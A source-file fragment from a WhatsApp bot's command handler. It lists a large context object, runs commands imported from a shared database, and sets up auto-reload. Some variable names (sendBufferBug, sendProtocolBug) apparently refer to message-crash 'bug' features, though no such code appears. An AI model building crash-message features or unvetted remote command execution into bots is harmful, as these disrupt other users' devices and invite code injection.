      possibleTarget: undefined,
      ppUrl: undefined,
      ppUrl2: undefined,
      prefix,
      premiumUsers: undefined,
      prepareWAMessageMedia,
      preparedImage: undefined,
      presences: undefined,
      printQRInTerminal: undefined,
      promoteError: undefined,
      proto,
      protocolMessage,
      protocolMsg: undefined,
      proxyResponse: undefined,
      ptt: undefined,
      publicMode: undefined,
      purple: undefined,
      purpose: undefined,
      pushname: undefined,
      q: undefined,
      q5Type: undefined,
      qrTimeout: undefined,
      quality: undefined,
      query: undefined,
      questions: undefined,
      quoted: undefined,
      quoted2: undefined,
      quoted3: undefined,
      quoted4: undefined,
      quoted5: undefined,
      quotedBP: undefined,
      quotedContent: undefined,
      quotedCopy: undefined,
      quotedDel: undefined,
      quotedEnh: undefined,
      quotedFwd: undefined,
      quotedKey: undefined,
      quotedMsg: undefined,
      quotedRBG: undefined,
      quotedReact: undefined,
      quotedVV: undefined,
      quotes2: undefined,
      qz: undefined,
      qzId: undefined,
      r: undefined,
      ram: undefined,
      randomMember: undefined,
      rank2: undefined,
      ranks: undefined,
      rate: undefined,
      rateData: undefined,
      rateRes: undefined,
      raw: undefined,
      rawSha: undefined,
      react: undefined,
      reason: undefined,
      reasonText: undefined,
      record: undefined,
      recursive: undefined,
      red: undefined,
      ref: undefined,
      regex: undefined,
      registerFont: undefined,
      reject: undefined,
      remaining: undefined,
      reminderOffsetSec: undefined,
      remoteJid: undefined,
      removed: undefined,
      renderBlinkingVideoWithFfmpeg: undefined,
      renderBoard: undefined,
      renderLargerThumbnail: undefined,
      replies: undefined,
      reply,
      repoText: undefined,
      reportText: undefined,
      req: undefined,
      reqText: undefined,
      requestOptions: undefined,
      requests: undefined,
      requests2: undefined,
      requests3: undefined,
      requests4: undefined,
      require,
      getMzaziApiKey,
      getSetting,
      res: undefined,
      resetWarn,
      resolve: undefined,
      response: undefined,
      responseType: undefined,
      result: undefined,
      result2: undefined,
      result3: undefined,
      result4: undefined,
      resultMsg: undefined,
      results: undefined,
      returnak: undefined,
      returneak: undefined,
      returnk: undefined,
      reuploadRequest: undefined,
      rgba: undefined,
      riddles: undefined,
      roasts: undefined,
      rock: undefined,
      roundRect: undefined,
      route: undefined,
      row: undefined,
      rows: undefined,
      rpsEmojis: undefined,
      rpsId: undefined,
      rpsWins: undefined,
      runtime,
      s: undefined,
      sad: undefined,
      sagittarius: undefined,
      samples: undefined,
      saveBP: undefined,
      saveCreds: undefined,
      saveDB,
      saveErr: undefined,
      saveJSON,
      savePath: undefined,
      saveSessionPaid,
      scId: undefined,
      scanLengths: undefined,
      scansSidecar: undefined,
      sciFacts: undefined,
      scissors: undefined,
      score: undefined,
      scorpio: undefined,
      scrambleWords: undefined,
      scrambled: undefined,
      search: undefined,
      searchCommands: undefined,
      searchResult: undefined,
      second: undefined,
      seconds: undefined,
      secret: undefined,
      secs: undefined,
      sections: undefined,
      selectableCount: undefined,
      selected: undefined,
      selfMode: undefined,
      sendBufferBug: undefined,
      sendLocationBug: undefined,
      sendProtocolBug: undefined,
      sendReport: undefined,
      sender,
      senderNum,
      senderNumber,
      sendnumb,
      sent: undefined,
      serverMessageId: undefined,
      sessionData: undefined,
      sessionDir: undefined,
      sessionFile,
      sessionId: undefined,
      sessionPaidUsers,
      sessionPath: undefined,
      setBotName,
      setChatbotStatus,
      setGroupSetting,
      setToggle,
      settings: undefined,
      settingsCommands: undefined,
      settingsPath,
      sg: undefined,
      sha1hash: undefined,
      sha256hash: undefined,
      shizokeys: undefined,
      short: undefined,
      shouldReconnect: undefined,
      show: undefined,
      showAdAttribution: undefined,
      showMenu: undefined,
      shuffle: undefined,
      side: undefined,
      sideEffects: undefined,
      sides: undefined,
      size: undefined,
      sleep: undefined,
      slice: undefined,
      songInfo: undefined,
      sourceUrl: undefined,
      sp: undefined,
      spRes: undefined,
      spawn: undefined,
      speed: undefined,
      src: undefined,
      srcMatch: undefined,
      ss: undefined,
      ss2: undefined,
      ssB: undefined,
      ssPath: undefined,
      ssPath2: undefined,
      ssPathB: undefined,
      ssUrl: undefined,
      stages: undefined,
      stamp: undefined,
      stanzaId: undefined,
      star: undefined,
      stars: undefined,
      start: undefined,
      startPing: undefined,
      startTime,
      startY: undefined,
      startedAt: undefined,
      startedBy: undefined,
      state: undefined,
      status: undefined,
      statusCode: undefined,
      statusColor: undefined,
      statusEmoji: undefined,
      statusSourceType: undefined,
      statusText2: undefined,
      sticker: undefined,
      stickerBuffer: undefined,
      stickerEmoji: undefined,
      stickerId: undefined,
      stickerMessage: undefined,
      stickerMsg: undefined,
      stickerSentTs: undefined,
      storage: undefined,
      stories: undefined,
      str: undefined,
      stream: undefined,
      string: undefined,
      sub: undefined,
      sub1: undefined,
      sub10: undefined,
      sub2: undefined,
      sub3: undefined,
      sub4: undefined,
      sub5: undefined,
      sub6: undefined,
      sub7: undefined,
      sub8: undefined,
      sub9: undefined,
      substanceName: undefined,
      succeeded: undefined,
      sym: undefined,
      symbols: undefined,
      synData: undefined,
      synRes: undefined,
      synonyms: undefined,
      t: undefined,
      t1: undefined,
      t2: undefined,
      tagMsg: undefined,
      tagTxt: undefined,
      target: undefined,
      targetBlock: undefined,
      targetDel: undefined,
      targetDm: undefined,
      targetGroupId: undefined,
      targetJid: undefined,
      targetJid2: undefined,
      targetJid3: undefined,
      targetMsg: undefined,
      targetName: undefined,
      targetNgl: undefined,
      targetNormal: undefined,
      targetNum: undefined,
      targetNum2: undefined,
      targetNum3: undefined,
      targetNumber: undefined,
      targetSticker: undefined,
      targetUnblock: undefined,
      taurus: undefined,
      teks: undefined,
      telegErr: undefined,
      temp: undefined,
      tempDir: undefined,
      tempFile: undefined,
      tempPath: undefined,
      text,
      text2: undefined,
      think: undefined,
      thumbnail: undefined,
      thumbnailBuffer: undefined,
      time: undefined,
      timeMs: undefined,
      timeStr: undefined,
      timeZone: undefined,
      timeZoneName: undefined,
      timeout: undefined,
      timeoutId: undefined,
      timer: undefined,
      title: undefined,
      tmpDir: undefined,
      tmpIn: undefined,
      tmpOut: undefined,
      to: undefined,
      toRemove: undefined,
      toVN: undefined,
      todGame: undefined,
      todId: undefined,
      today: undefined,
      top: undefined,
      total: undefined,
      totalCommands: undefined,
      totalGroups: undefined,
      totalMem: undefined,
      totalUsers: undefined,
      translatte: undefined,
      tries: undefined,
      triesLeft: undefined,
      truncated: undefined,
      truths: undefined,
      tttId: undefined,
      turn: undefined,
      txt: undefined,
      txt6: undefined,
      type,
      typing: undefined,
      tzDate: undefined,
      tzFormatted: undefined,
      u: undefined,
      uniqueCases: undefined,
      unknown: undefined,
      unmTarget: undefined,
      update: undefined,
      updated: undefined,
      upload: undefined,
      uptime: undefined,
      uptimeSeconds: undefined,
      uptimeStr: undefined,
      uptimeString: undefined,
      url: undefined,
      url5: undefined,
      useMultiFileAuthState: undefined,
      used: undefined,
      used2: undefined,
      used3: undefined,
      usedApi: undefined,
      usedMem: undefined,
      usedWords: undefined,
      user: undefined,
      userAns: undefined,
      userChoice: undefined,
      userJid: undefined,
      userNumber: undefined,
      username: undefined,
      utc: undefined,
      utilityCommands: undefined,
      uuidVal: undefined,
      v: undefined,
      v5: undefined,
      vOnceType: undefined,
      val: undefined,
      validImgModes: undefined,
      validMembers: undefined,
      validModes: undefined,
      validReasons: undefined,
      validStickerModes: undefined,
      validTypes: undefined,
      value: undefined,
      valueText: undefined,
      values: undefined,
      vaporResult: undefined,
      vcName: undefined,
      vcNum: undefined,
      vcard: undefined,
      vcard2: undefined,
      verses: undefined,
      version,
      vf: undefined,
      vidApi: undefined,
      video: undefined,
      videoBuffer: undefined,
      videoBuffer2: undefined,
      videoFormat: undefined,
      videoId: undefined,
      videoRes: undefined,
      videoUrl: undefined,
      videoUrl2: undefined,
      video_url: undefined,
      videos: undefined,
      viewOnce: undefined,
      viewOnceMessage: undefined,
      views: undefined,
      virgo: undefined,
      vn: undefined,
      w: undefined,
      wCount: undefined,
      warn: undefined,
      warnCount: undefined,
      warnings: undefined,
      warns: undefined,
      warns2: undefined,
      wasAlreadyMapped: undefined,
      waveform: undefined,
      wcId: undefined,
      weekday: undefined,
      wg: undefined,
      white: undefined,
      width: undefined,
      wikiData: undefined,
      wikiRes: undefined,
      will: undefined,
      win32: undefined,
      wind: undefined,
      wins: undefined,
      word: undefined,
      wordList: undefined,
      words2: undefined,
      writeExifVid: undefined,
      wrong: undefined,
      wrongLetters: undefined,
      wyrs: undefined,
      x: undefined,
      y: undefined,
      year: undefined,
      yellow: undefined,
      ytdl: undefined,
      yts,
      yts2: undefined,
      yts3: undefined,
      yuv420p: undefined,
      z: undefined,
      zA: undefined,
      zalgoChars: undefined,
      helpers: undefined,
      // MZAZI site API — for Download/AI commands (settings.js)
      mzaziSiteUrl: config.mzaziSiteUrl || "https://mzazi.shop",
      mzaziApiKey: config.mzaziApiKey || "",
    });

    if (command === "synccmd" || command === "sync") {
      if (!isOwner) return mzazireply("❌ Owner only.");
      await mzazireply("⏳ Importing commands from the shared database...");
      const r = await syncRemoteCommands();
      if (r.ok) return mzazireply(`✅ Imported ${r.data.commands.length} commands from the shared database.`);
      return mzazireply(`❌ Import failed: ${r.error}`);
    }

    if (command === "remote") {
      const status = getRemoteStatus();
      if (!status.keyConfigured) {
        return mzazireply('❌ DATABASE_URL is not set — the bot cannot import commands from the shared Neon database.');
      }
      const list = listRemoteCommands();
      if (list.length === 0) return mzazireply(`📭 No remote commands yet.\n\nSync with: ${prefix}synccmd`);
      const lines = list.map((c) => `• ${prefix}${c.name}${c.ownerOnly ? " 🔒" : ""} — ${c.description}`).join("\n");
      return mzazireply(
        `🌐 *Remote Commands* (${list.length})\n\n${lines}\n\n` +
        `Last sync: ${status.syncedAt || "never"}` +
        (status.lastError ? `\n⚠️ Last sync error: ${status.lastError}` : "")
      );
    }

    // ── Imported command execution ─────────────────────────────────────────────
    if (command) {
      const remoteCmd = getRemoteCommand(command);
      if (remoteCmd) {
        try {
          if (remoteCmd.ownerOnly && !isOwner) return mzazireply("❌ Owner only.");
          if (remoteCmd.adminOnly && !isAdmin && !isOwner) return mzazireply("❌ Admins only.");
          if (remoteCmd.groupOnly && !isGroup) return mzazireply("❌ Groups only.");
          await runRemoteCommand(remoteCmd, buildCommandContext());
        } catch (e) {
          logSystem(`Imported command "${command}" error: ${e.message}`, "error");
          await mzazireply(`❌ Command error: ${e.message}`);
        }
        return;
      }

      // Nothing matched. If the registry never loaded, say so (in DMs) instead
      // of staying silent — this surfaces sync/key problems immediately.
      const regStatus = getRemoteStatus();
      if (regStatus.count === 0) {
        const why = !regStatus.keyConfigured
          ? "DATABASE_URL is not set — the bot cannot import commands from the shared Neon database"
          : regStatus.lastError
            ? `import failed: ${regStatus.lastError}`
            : "registry is empty";
        logSystem(`Command "${command}" ignored — no commands loaded (${why})`, "warn");
        if (!isGroup) {
          return mzazireply(
            `⚠️ Commands are not loaded yet.\n\nReason: ${why}\n\nRun .synccmd to retry the sync.`
          );
        }
      }
    }

  } catch (error) {
    logger.error('WhatsApp message handler error:', error);
    try {
      await mzazi.sendMessage(sender, { text: '❌ An error occurred while processing your command.' });
    } catch (e) {}
  }
};

// ── Group event handlers ──────────────────────────────────────────────────────

// ── Exports ──────────────────────────────────────────────────────────────────


// ── Auto-reload (without restarting server) ──────────────────────────────
// ── At the top of case.js ──────────────────────────────────────────────────
// ── Your case handler ──────────────────────────────────────────────────────
// ... all your existing case code ...

// ── Auto-reload (FIXED) ──────────────────────────────────────────────────
let file = require.resolve(__filename);

// Only watch in development - prevents Pterodactyl restart
if (process.env.NODE_ENV !== 'production') {
  fs.watchFile(file, { interval: 1000 }, () => {
    fs.unwatchFile(file);
    
    // FIXED: Use logSystem instead of logger.info
    logSystem(`🔄 Reloading ${__filename}...`, 'info');
    
    try {
      // Clear cache and reload
      delete require.cache[file];
      const updated = require(file);
      
      // Update exports with new module
      Object.assign(module.exports, updated);
      
      logSystem(`✅ ${__filename} reloaded successfully!`, 'success');
    } catch (error) {
      logSystem(`❌ Reload failed: ${error.message}`, 'error');
    }
  });
}

// ── Exports ──────────────────────────────────────────────────────────────────
module.exports.handleGroupParticipantsUpdate = handleGroupParticipantsUpdate;
module.exports.handleGroupsUpdateEvent = handleGroupsUpdateEvent;